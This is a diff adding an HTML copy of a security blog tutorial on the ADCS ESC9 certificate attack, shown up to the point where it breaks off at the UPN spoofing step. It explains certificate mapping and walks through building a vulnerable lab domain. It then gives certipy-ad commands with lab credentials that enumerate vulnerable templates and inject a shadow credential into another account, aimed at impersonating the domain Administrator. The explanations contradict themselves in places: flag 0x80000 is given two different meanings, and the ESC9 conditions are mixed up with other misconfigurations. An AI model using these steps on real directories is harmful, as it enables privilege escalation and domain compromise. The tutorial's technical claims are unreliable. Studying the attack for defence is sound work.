@@ -1,0 +1,258 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC9 – No Security Extension</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc9-no-security-extension/" rel="bookmark"><time class="entry-date published" datetime="2025-06-15T14:11:20+00:00">June 15, 2025</time><time class="updated" datetime="2025-06-19T13:22:52+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">Misconfigured certificate templates, particularly those affected by <strong>ESC9</strong>, pose a critical threat to Active Directory environments. By disabling the szOID_NTDS_CA_SECURITY_EXT security extension through the CT_FLAG_NO_SECURITY_EXTENSION flag, even with StrongCertificateBindingEnforcement enabled, weak or implicit certificate mappings can still be exploited. This misconfiguration enables attackers to bypass security mechanisms and potentially escalate privileges to <strong>unauthorized domain admin access</strong>.</span></p>
+<p><span style="color: #000000">In this article, we break down the concept of <strong>certificate mapping</strong> (implicit vs. explicit, weak vs. strong), explain the role of <strong>certificate template attributes</strong>, and highlight how <strong>ESC9</strong> creates a dangerous security loophole in enterprise networks.</span></p>
+<h3><span style="color: #800000">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Overview the ESC9 Attack</strong></span></li>
+<li><span style="color: #000000"><strong>ESC9 Integer Attributes</strong></span></li>
+<li><span style="color: #000000"><strong>Certificate Mappings</strong></span></li>
+<li><span style="color: #000000"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000"><strong>Lab Setup</strong></span></li>
+</ul>
+<p><span style="color: #000000"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000">Method 1: Template-Based Admin Impersonation</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using certipy LDAP Shell as Administrator</span></li>
+<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000">Overview the ESC9 Attack</span></h3>
+<p><span style="color: #000000"><strong>ESC9</strong> is one of the escalation paths identified in Active Directory Certificate Services (ADCS) that allows an attacker to <strong>abuse misconfigured certificate templates</strong> to impersonate <strong>privileged users</strong>, such as <strong>Domain Admins</strong>.</span></p>
+<p><span style="color: #000000">It specifically occurs when:</span></p>
+<ul>
+<li><span style="color: #000000">A certificate template allows <strong>users to supply Subject Alternative Names (SANs)</strong> (like UPNs), and</span></li>
+<li><span style="color: #000000">The <strong>Certificate Authority (CA)</strong> honors these SANs without adequate restrictions.</span></li>
+</ul>
+<p><span style="color: #000000">As a result a low-privileged user can request a certificate for <strong>any identity</strong> (e.g., a Domain Admin), then use that certificate to obtain a <strong>Kerberos TGT</strong> via <strong>PKINIT</strong>, leading to <strong>full domain compromise</strong>.</span></p>
+<p><span style="color: #000000"><strong>Conditions Required for ESC9</strong></span></p>
+<p><span style="color: #000000">To be exploitable, the following conditions must all be <strong>true</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Subject name or SAN can be supplied in the request → controlled by the msPKI-Certificate-Name-Flag attribute; values like 1, 17, etc., indicate vulnerability</span></li>
+<li><span style="color: #000000">CA honors SANs in requests → enabled via the EditFlags registry key (0x10000000 = EDITF_ATTRIBUTESUBJECTALTNAME2)</span></li>
+<li><span style="color: #000000">Template is accessible by low-privileged users → ENROLL permission is granted to <strong>Domain Users</strong> or <strong>Authenticated Users</strong></span></li>
+<li><span style="color: #000000">No subject name enforcement → the template doesn’t restrict to only AD-resolved names</span></li>
+<li><span style="color: #000000">UPN spoofing is possible → an attacker can request a certificate for any UPN, even one belonging to a Domain Admin</span></li>
+</ul>
+<h3><span style="color: #800000">ESC9 Integer Attributes</span></h3>
+<p><span style="color: #000000">The msPKI-Certificate-Name-Flag and msPKI-Enrollment-Flag attributes in Active Directory Certificate Services (ADCS) control how certificate templates handle subject names and enrollment behaviors. Here’s an overview:</span></p>
+<p><span style="color: #000000"><strong>msPKI-Certificate-Name-Flag Values:</strong></span></p>
+<ul>
+<li><span style="color: #000000">0x0 / 0 → Build from AD only (<strong>Safe</strong>)</span></li>
+<li><span style="color: #000000">0x1 / 1 → Supply in request (<strong>Vulnerable to ESC9</strong>)</span></li>
+<li><span style="color: #000000">0x3 / 3 → Build from AD + Supply in request (<strong>Also vulnerable</strong>)</span></li>
+<li><span style="color: #000000">0x10 / 16 → Enforce UPN in SAN (<strong>Required for ESC9 if combined with supply in request</strong>)</span></li>
+</ul>
+<p><span style="color: #000000"><strong>msPKI-Enrollment-Flag Bit Values:</strong></span></p>
+<ul>
+<li><span style="color: #000000">0x1 / 1 → Include symmetric algorithms</span></li>
+<li><span style="color: #000000">0x2 / 2 → Allow key archival</span></li>
+<li><span style="color: #000000">0x10 / 16 → Remove revoked certificates from store</span></li>
+<li><span style="color: #000000">0x20 / 32 → Do not persist subject</span></li>
+<li><span style="color: #000000">0x40 / 64 → Include email in subject</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Other Flags:</strong></span></p>
+<ul>
+<li><span style="color: #000000"><strong>flags (general)</strong> → Controls template availability, auto-enrollment, etc.</span></li>
+<li><span style="color: #000000"><strong>msPKI-Template-Schema-Version</strong></span></li>
+</ul>
+<p><span style="color: #000000">1 = Legacy Template</span></p>
+<p><span style="color: #000000">3 = Modern Template</span></p>
+<p><span style="color: #000000">If msPKI-Certificate-Name-Flag = <strong>1</strong> or <strong>3</strong> And <strong>SAN </strong>includes<strong> UserPrincipalName,</strong> <strong>ESC9 is exploitable.</strong></span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: </em><em>For more detailed information, refer to </em><span style="color: #0000ff"><a style="color: #0000ff" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1"><em>Microsoft’s documentation</em></a></span><em> on the msPKI-Certificate-Name-Flag and msPKI-Enrollment-Flag attributes</em></span></p>
+<h3><span style="color: #800000">Certificate Mappings</span></h3>
+<p><span style="color: #000000"><strong>ESC9</strong> is a critical misconfiguration in Active Directory Certificate Services (AD CS) that allows attackers to bypass strong authentication and impersonate privileged users.</span></p>
+<p><span style="color: #000000">At the heart of this issue is <strong>certificate mapping</strong> which is the process that links a certificate to an AD account. At its core, the issue revolves around <strong>certificate mapping</strong>:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>Implicit Mapping</strong>: Matches the certificate’s <strong>Subject Alternative Name (SAN)</strong> with AD account attributes like userPrincipalName. Easy to use but Vulnerable if strong enforcement is not applied (SAN spoofing risk).</span></li>
+<li><span style="color: #000000"><strong>Explicit Mapping</strong>: Requires manual linking of the certificate via the altSecurityIdentities More secure but Risky if attackers can modify user attributes.</span></li>
+</ul>
+<p><span style="color: #000000">Normally, <strong>strong mappings</strong> are enforced when a certificate includes a special security extension (szOID_NTDS_CA_SECURITY_EXT). This extension ensures that only certificates issued by trusted certificate authorities (CAs) can authenticate users securely.</span></p>
+<p><span style="color: #000000">However, when a certificate template has the <strong>CT_FLAG_NO_SECURITY_EXTENSION</strong> flag set, that critical extension is <strong>excluded</strong>. This disables strong mapping, even if the system is configured to enforce it (StrongCertificateBindingEnforcement = 1).</span></p>
+<p><span style="color: #000000">As a result, <strong>weak mapping is allowed</strong>, and attackers can:</span></p>
+<ul>
+<li><span style="color: #000000">Enroll a certificate based on a vulnerable template</span></li>
+<li><span style="color: #000000">Modify an AD account’s altSecurityIdentities attribute</span></li>
+<li><span style="color: #000000">Use that certificate to authenticate as any user, even a <strong>Domain Admin</strong></span></li>
+</ul>
+<p><span style="color: #000000">This is the core of <strong>ESC9</strong>: by exploiting misconfigured certificate templates, an attacker can turn weak mappings into a powerful path for <strong>privilege escalation</strong>.</span></p>
+<h3><span style="color: #800000">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000">Tools: Evil-Winrm, certipy-ad</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup</span></h3>
+<h4><span style="color: #000000">Step 1: Open the Certificate Templates Console</span></h4>
+<ul>
+<li><span style="color: #000000">Firstly, open <strong>Certification Authority</strong> (certsrv.msc).</span></li>
+<li><span style="color: #000000">Then, Right-click on <strong>Certificate Templates</strong> → Click <strong>Manage</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijsY2HjjyjFoxpd6nTZFXlHSLVnPtYhEHjW30j84bjmmllT3zUtk4eUQmR7urYY8ZLnGJPGt-A9TldQonbyLhSZGtOkKvu_IemyqtQWSnBn-sZiLNVzT_dzjTMoFJOPUE9jQ7-VsOW09mR9SAj0YEcNrcMPE5Ca60FQ2I9xXoJdeVRswAPXXUgiT5EWciC/s16000/1.png" alt="ADCS ESC9 Exploit" width="1008" height="815"/></span></p>
+<h4><span style="color: #000000">Step 2: Duplicate the ‘User’ Template</span></h4>
+<ul>
+<li><span style="color: #000000">Locate the <strong>User</strong></span></li>
+<li><span style="color: #000000">Then, Right-click → Select <strong>Duplicate Template</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJT-NV9NZ1vygw25_I6rgLRFkp-xYBx7QCkX9ahvstrc_zf4SkUYkBBdY6KTAU1tkRJ8Sstw7T9vNFPsBRANvlx1FmmwvUP0juxUoE-6mr3WMIELEMsuXw2dthyphenhyphendyDypaD8uMpu76i7fTcuJun0d1xb_bwoWyWktPM3nSmw3zG5NVvdsk6E-LHXNb2R-fL/s16000/2.png"/></span><br/>
+<span style="color: #000000"><strong><em>Note:</em></strong><em> When creating or duplicating a certificate template, choose <strong>Windows Server 2016</strong> (or a compatible version) for <strong>Template Compatibility</strong>. This determines available features, such as support for <strong>Subject Alternative Names (SANs)</strong>.</em></span></p>
+<h4><span style="color: #000000">Step 3: Configure General Template Info</span></h4>
+<p><span style="color: #000000">Under the <strong>General</strong> tab:</span></p>
+<ul>
+<li><span style="color: #000000">Change <strong>Template Display Name</strong> to ESC9.</span></li>
+<li><span style="color: #000000">Then, Set validity/renewal period as needed.</span></li>
+<li><span style="color: #000000">Check <strong>Publish certificate in Active Directory</strong>.</span></li>
+</ul>
+<p><span style="color: #000000">And Click<strong> Apply </strong>then<strong> OK.</strong></span></p>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgH9KGihtWWFmJELxNSWGwoxU3QmwtUa54eck0WUqTOic4DLYzaQE91iDKZAc2HRPwI_gr8QEtUz1hX5WcAbpa82aWHQhbT1zGT6wz7gtvFuX0Ide_rBgVg7-2FAZiwETT8S9wBvBjggEwpBXUYMX7PtHEO_GOXlOJdH_9m1HX5swMz1Zrbl1zsf-Fzv4-S/s16000/3.png" alt="ADCS ESC9 Exploit" width="593" height="831"/></span></p>
+<h4><span style="color: #000000">Step 4: Configure Subject Name — Default (Secure) State</span></h4>
+<p><span style="color: #000000">Then, go to the <strong>Subject Name</strong> tab: Ensure</span></p>
+<ul>
+<li><span style="color: #000000"><strong>Build from this Active Directory information</strong> is selected.</span></li>
+<li><span style="color: #000000"><strong>Include e-mail name in subject name</strong> is not checked.</span></li>
+<li><span style="color: #000000"><strong>User principal name (UPN)</strong> is checked under SAN.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMk2w1_vPlUXOE0QhHaFKk01gzVqOzZsCYKig4okKUyUlViy6KJCVuf2DtBWJ1e8T74V879urV_ArAE00KeX9V33kk6Jri0jg06rsS7zohKOWc-xN_W_Bhx1v0fgz37xckBEJFKe-9jKuzWoPsIo0JERg5SwFmojUYpxoB9mPkbFszIBWQvps328ukKxBp/s16000/4.png"/></span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This is the <strong>default configuration</strong>. It restricts impersonation.</em></span></p>
+<h4><span style="color: #000000">Step 5: Return to Certification Authority Console</span></h4>
+<p><span style="color: #000000">Back in certsrv.msc, right-click <strong>Certificate Templates</strong> → <strong>New</strong> → <strong>Certificate Template to Issue</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMztVVVGyQWMXbbTbIhc6iOjieZ1wlnnPyczf_l4zI5YaPQdbOqHSXRBXuVy1XWULruHmFkagOMo9eEwGaXrwNLtwc6mJVBa7x01gNsXqtnAJzDVL4Y7ns8VoCr9XoWPwXm1K9WmV1oLrYQ72M2lIUYAJVM1KGNksm2Vbd-tGUA5AHR9qcixZ6S5X_qhj4/s16000/5.png" alt="ADCS ESC9 Exploit" width="980" height="831"/></span></p>
+<h4><span style="color: #000000">Step 6: Confirm ESC9 Is Now Issued</span></h4>
+<ul>
+<li><span style="color: #000000">Verify ESC9 appears under the <strong>Certificate Templates</strong> node in the CA console.</span></li>
+<li><span style="color: #000000">From the list, select the newly created ESC9 template.</span></li>
+<li><span style="color: #000000">Click <strong>OK</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiglb_WNusgwKi4mr5WLrfMM3VxCmTXknnkPqaL8HpL9RKSmEdLRoaYpl8SQYbTh035kkBv_i1Iw-rltXWHPTl7szZN5yY74IMSm1LynK1tzldO6Ji__dYLP4-eexK52qgZsMhtww3sRFpwozdhlaLHYxlmgrmOU_yy6iYuR5Oa0SNU9b17A9KpfEoVqIEW/s16000/6.png"/></span></p>
+<h4><span style="color: #000000">Step 7: Open ADSI Edit</span></h4>
+<p><span style="color: #000000">Then launch <strong>ADSI Edit</strong> (adsiedit.msc).</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCDTrjEAyKtcDk3HmpnfFFXcz9sYVgnhyphenhyphen_l-0lUaaPm8IcfWL6lTMoXrDrNYTjMZ4QsFju5xrSXc2c8zvXl4cBUxw8iu9fh7hgMdoNV2_4CaXXtkRM1tC2tBABeXMtQ4Gm963aRLEfBEim-WEvkPQ-um-Vd53dAbTQWVuaG7c44OjSV5KTpSH5M0-7QK5Y/s16000/7.png"/></span></p>
+<h4><span style="color: #000000">Step 8: Select Connect to… and choose Configuration context.</span></h4>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiv0aGcA6siO_Y9_L-MGYB-5d7U2d3L6jO6ExhtTZhk-Nw4VzShvlrrMzKknPKeoslNjyWNCFg264YhGbDSsRT4xws7HBFrqXd-PORW4Ttprxp4g1SvcFbktC6fh3i7MMUAfC8_nC4eBkU_q7nuzkLE_2ggSKQZkCyeVf-zjZ1MIGDb6-fglX-o9X7kiJjZ/s16000/8.png" alt="ADCS ESC9 Exploit" width="586" height="526"/></span></p>
+<h4><span style="color: #000000">Step 9: In the Connection Settings window:</span></h4>
+<p><span style="color: #000000">Under <strong>Select a well known Naming Context</strong>, choose: Configuration</span></p>
+<p><span style="color: #000000">Click <strong>OK</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSdktObuw8lskhyZfnoZCxwfUB1XhZhUsfsU7YxH4a7Fzjfw5IsCq4CZh1T0DA5c7KcpNcUvuTor-iTofDZ6IwCNbtIhGZqakrozbefe_VHojeslsZqJipnUWZBQZlyfRBtWth6PmrktjPi7GuL5YzjljrYlgh7u_HUrEv40IpiC0PlnEiwaI2jt5vLeSP/s16000/9.png"/></span></p>
+<h4><span style="color: #000000">Step 10: Navigate through the following path:</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Configuration [DC=ignite,DC=local]
+ └── CN=Configuration,DC=ignite,DC=local
+     └── CN=Services
+         └── CN=Public Key Services
+             └── CN=Certificate Templates</pre>
+<p><span style="color: #000000">Inside <strong>CN=Certificate Templates</strong>, find:</span></p>
+<p><span style="color: #000000">The object: CN=ESC9This confirms your template is now visible in the Active Directory Configuration Partition.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEik2wj76PMto2aLPZeHbMNgHZXmpkKopK-FwF6pq7LTahUmjPQeyIldreDA8Gbd0p0Wb90cDbSnRAdGtJxIVnAlbs5_l0D38zx-ZAjvKVAlNaS1cwIVW9RWvydq5OugIAS9i5UNAhsVu1wEd-qhxH63SlW2_XMQK7ij4UDSjKuWOe5CREE4OxZKo-NeMjFP/s16000/10.png" alt="ADCS ESC9 Exploit" width="1128" height="870"/></span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: Certificate templates are stored in the AD Configuration partition, not on the CA, allowing inspection of template GUIDs (which can be relevant in request abuse scenarios), Access Control Lists (ACLs) that may be leveraged in abuse chaining, and advanced attributes like </em><em>msPKI-Template-Schema-Version</em><em>, </em><em>msPKI-Certificate-Name-Flag</em><em>, and </em><em>msPKI-Enrollment-Flag</em><em>.</em></span></p>
+<h4><span style="color: #000000">Step 11: In the Attribute Editor tab:</span></h4>
+<ul>
+<li><span style="color: #000000">Scroll to find: <strong>msPKI-Enrollment-Flag</strong></span></li>
+<li><span style="color: #000000">Double-click to edit.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhImHeLVjCIahTSwS6ft-6hLgZBRW2XS8iGYT8Y37rgaJQkNc9dVn-EzQ9iy7cDDJp4HT5Q1L6lw0jx9wXGV_pc9kCWF9fbJQ-1tvcx4Y-xw0zy4oht8nDIZKB6QiDY-1EInUeVnRROaEF_YTH8SXZ50mwrNGLRIzEI1QU0PiAagOUrmMPbGlOGtAVLeDZD/s16000/11.png"/></span></p>
+<h4><span style="color: #000000">Step 12: Set Value: 0x80000</span></h4>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMOfxXV_yOX7L0xi4TgIoDwuJK9gMs1a3Bbg0N8ll9NAU5OT3y_Y0ka7jwrRSkW2mwlmg40Vd2tOzYh368gIYjy2W5F4YsgW78k-wepYJkWIXqcxnJWQpEF5F_5IGUkc-HlIhMReBI_agwRsHrcghZNQ6XG-O9szGMSUtdVmeFSq4BxhCK1SzUB2W7YMYa/s16000/12.png"/></span></p>
+<p><span style="color: #000000">The 0x80000 (PEND_ALL_REQUESTS) flag means all certificate requests need manual CA approval, useful for auditing or access control testing.</span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This sets the flag to <strong>Remove revoked certificates from store</strong> (used in some real-world templates)</em></span></p>
+<h4><span style="color: #000000">Step 13: Ensure its value is 524288 (or includes it, if combined with other flags).</span></h4>
+<p><span style="color: #000000">Click <strong>Ok</strong></span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnrvJFBchh7cloojrwG-9ST213EQ_DGHvc4EYeBcvWd6-bitwQMMcEcXQ0zM9CzkZRODTb2xN-jlatbDa0DTSXJ_iG42cgcZ2z5b14D5Aac7CCmHHWsfn4r7Nx4rni33-9lra3JQkGw-oHLmF5LJW8eHJFI2k9dfXrNxi1oLQUxjltPhSHINtDRjVXwZrX/s16000/13.png" alt="ADCS ESC9 Exploit" width="587" height="671"/></span></p>
+<h4><span style="color: #000000">Step 14: Still in ADSI Edit → CN=ESC9 → Properties</span></h4>
+<ul>
+<li><span style="color: #000000">Click <strong>Security</strong> tab → Click <strong>Add…</strong></span></li>
+<li><span style="color: #000000">Enter username: sanjeet</span></li>
+<li><span style="color: #000000">Select user and under <strong>Permissions</strong>, check: Write</span></li>
+<li><span style="color: #000000">And Click <strong>OK</strong></span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9-Ie0_NH3rV1tXbJv6gxRaFrFaroNJgf0o8ek_oo45GdNylYy4C7AP26v4v8Pdjm1etEocijL2vLqUsAF2_wqlv1kBYguGxYROs285y3cqshje0Pqkc5_crF-JsRjc3AioujpX2Z30TP72vfBJDZn7JwHQPM3kpXJ8C1tzhD_NdhvycfdIPfE8RRSu6ve/s16000/14.png" alt="ADCS ESC9 Exploit" width="608" height="828"/></span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: If we have write permissions on a vulnerable template, we can modify its settings (e.g., add SANs, escalate privileges), which is a key step in ADCS attacks like </em><span style="color: #0000ff"><a style="color: #0000ff" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/"><em>ESC1</em></a></span><em> and ESC9.</em></span></p>
+<h4><span style="color: #000000">Step 15: In the CA server, open: regedit.exe</span></h4>
+<ul>
+<li><span style="color: #000000">Navigate to: ComputerHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServiceskdc</span></li>
+<li><span style="color: #000000">Find or create a <strong>DWORD value</strong>:</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEju4peuvFiDnKzHAgc39CvSuFltXsoZ86KiWF9h_U6qXk1iPSKnwsTcbx8bnnJFjy3b_CKee2ZdxXO_KwDnbs7bngDBWficVDEDJBmhcKd5Pl4Dj5NuavD9KFhkX8bD6MUCtlHOByG4yhInyt9kuOc97Y2Wh7tofi7axnAqRthetdTLbgnXid9CM7kXH2R1/s16000/15.png"/></span></p>
+<h4><span style="color: #000000">Step 16: Set value: Hex: 0x10000000</span></h4>
+<ul>
+<li><span style="color: #000000">And <strong>Click Ok</strong></span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBr7NuZaEd_ppCS0zcjTBvc7UwZGMAD7Zt46JyKUMzug6gFelKduY7X7l2kC8bzX6Le7F2-vt6pBJmPgqQP33eFCgXW97NLP0PYIaZBWO4TtBMRcvwuhcT6gHmeQUmzC_YHHarMlg4Qtr8kGourybOUBWisfQ4KGoPTb1tE593WRmyckrztdqXh99fAVOV/s16000/16.png" alt="ADCS ESC9 Exploit" width="852" height="788"/></span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: The flag 0x10000000 (268435456) = <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong>, allows the SAN field in certificate requests to be honored, crucial for ESC9 abuse in ADCS attacks.</em></span></p>
+<h3><span style="color: #000000"><span style="color: #800000">Enumeration &amp; Exploitation</span> </span></h3>
+<h4><span style="color: #800000">Method 1: Template-Based Admin Impersonation</span></h4>
+<p><span style="color: #000000">In this method, we exploit two key weaknesses: we identify <strong>misconfigured certificate templates</strong> that allow user-controlled fields like UPN/SAN (via CT_FLAG_NO_SECURITY_EXTENSION), and we observe <strong>weak certificate mapping</strong> enforcement, where systems in Active Directory accept authentication based solely on the UPN in a certificate, regardless of whom it issues the certificate to. This attack doesn’t rely on stealing credentials or hashes, but instead, we abuse AD’s <strong>PKI trust model</strong> by manipulating how certificates map to user identities.</span></p>
+<h4><span style="color: #000000">Discover Vulnerable Templates</span></h4>
+<p><span style="color: #000000">To exploit ESC9, first identify vulnerable certificate templates using Certipy:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite. local' -p Password@1 -dc-ip 192.168.1.16 -vulnerable -enabled</pre>
+<p><span style="color: #000000">This checks for templates with the CT_FLAG_NO_SECURITY_EXTENSION flag that allow users to set identity fields like UPN. These misconfigured templates enable weak certificate mapping and form the core of ESC9, making it possible to impersonate privileged users without credentials.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOcZg1liI8dMmEoOihT6PEem1mfNzRu-s9VczoNn1HC7TfrUOpBjpW4EpYhzBRKO6mCG9Z9tXUfUSo32UnU5v0LhqwpQbUOABHPVNZJp4bS7FATBb1xwurGdAkUeFq60LVZEKA1mY2RIk_7vkBI5SGOwKMEn81WJ_laR9C8uOH5IrrrMtRTbrPPtdLht6y/s16000/17.png"/></span></p>
+<p><span style="color: #000000">After running Certipy, open the generated .txt file to review certificate authority details:</span></p>
+<p><span style="color: #000000">This confirms the CA name (ignite-DC1-CA), and shows key settings like Web Enrollment: Disabled, Request Disposition: Issue, and most importantly, that <strong>User Specified SAN</strong> is disabled, which aligns with ESC9 characteristics, relying only on the spoofable UPN field.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge5tndiMuIFk7x9h8PvbZ8i_M3-DX1zzPzYnmOPtLLPLdw9Oj65CRNeQc_CN0afL-Q3uWN-h0aQsgifA9-w2GeKJTegn_1Z-LVNJli4PCh7eWTK5EsG0RF9-MP6nhfh9SVqAS-U8d11FWgPTG4qe4SMxbb2XYs_2LHwvXjXX1YWvVuRqOUT1GD8M078kh-/s16000/18.png" alt="ADCS ESC9 Exploit" width="747" height="360"/></span></p>
+<p><span style="color: #000000">Scroll down in the same .txt output to inspect individual template details, especially those marked as vulnerable:</span></p>
+<p><span style="color: #000000">Look for:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>Template Name:</strong> ESC9</span></li>
+<li><span style="color: #000000"><strong>Enrollment Flag:</strong> NoSecurityExtension</span></li>
+<li><span style="color: #000000"><strong>Enrollment Rights:</strong> Includes Domain Users</span></li>
+<li><span style="color: #000000"><strong>Vulnerabilities:</strong> Marked explicitly as ESC9</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2vfi1h3HmWFpeo_aR9frKFnEIf4izxgUYALRiO8L0IVt7BNg7kdCVMLN2OnB_Ek_KNzEAvw6ENvM_45esrML1KaYik_9XArZSYr_rUW1nJMLONKeNsU2YUjU6_8BytQcGXfCHQJDgcHoViJug7MF-Br96G-0k_JELSYAX5tzGpK1_m8l-7rUeJfaxH58Z/s16000/19.png"/></span></p>
+<p><span style="color: #000000">This demonstrates that any user in the Domain Users group (like raj) can enroll a certificate from this template and that no certificate security extensions enforce any rules. These conditions are exactly what one needs to proceed with an ESC9-based impersonation.</span></p>
+<h4><span style="color: #000000">Inject Shadow Credential into Proxy Account</span></h4>
+<p><span style="color: #000000">Next, gain access to a writable account (proxy) by injecting a shadow credential:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow auto -u raj@ignite. local -p Password@1 -account sanjeet -dc-ip 192.168.1.16</pre>
+<p><span style="color: #000000">This injects a shadow credential into the sanjeet account, enabling authentication without knowing the password. This step prepares a proxy identity that we’ll use to impersonate the Administrator when requesting a certificate.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVaPuIGIizbJtRtN0iXcBHQ-V2Ah-CR0AJC_lm842ycKkyv2KAoa5a-Ia8nJsWfBet8RfgBZXK_bc9ZCv-_0SnWleHiocfYdlpzyF7EesQitLf-MTujWUE3IDBDfXEWixae7sEQFojIxCitNQr8xcZGVXjYv3-1SB66YeJvlVxWfJotSUDZLtLfTbTu-i5/s16000/20.png" alt="ADCS ESC9 Exploit" width="1317" height="492"/></span></p>
+<h4><span style="color: #000000">Spoof UPN of Proxy Account</span></h4>
+<p><span style="color: #000000">Then, spoof the UPN of the proxy account to match the Administrator:</span></p>
